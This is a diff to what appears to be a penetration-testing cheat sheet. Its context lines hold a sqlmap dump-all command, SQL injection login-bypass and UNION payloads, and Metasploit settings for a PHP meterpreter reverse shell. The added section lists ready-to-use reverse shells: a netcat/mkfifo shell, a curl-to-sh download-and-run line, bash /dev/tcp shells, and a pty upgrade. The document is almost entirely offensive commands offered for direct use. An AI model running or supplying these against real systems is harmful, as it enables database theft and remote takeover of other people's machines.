@@ -47,7 +47,7 @@
 - `sqlmap -r req.txt --tamper=space2comment --dump-all --dbms mysql`
 
 - try `' or 1=1--` in the username and password field
-- enumrate how many columns there are
+- enumerate how many columns there are
 - `user='UNION SELECT NULL,'test',NULL,NULL--&password=admin`
 
 ### msfvenom and msfconsole reverse shell
@@ -59,7 +59,13 @@
 - `set payload php/meterpreter_reverse_tcp`
 - `set LHOST 10.0.0.1`
 - `set LPORT  9998`
-- `run`
+- `run``
 
+###### Reverse shells
 
+- `mkfifo /tmp/boop;nc IP PORT 0</tmp/boop | /bin/sh -i 2>&1 | tee /tmp/boop`
+- `curl http://IP:port/shell.sh | sh`
+- `exec("/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'");`
+- `/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'`
 
+- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
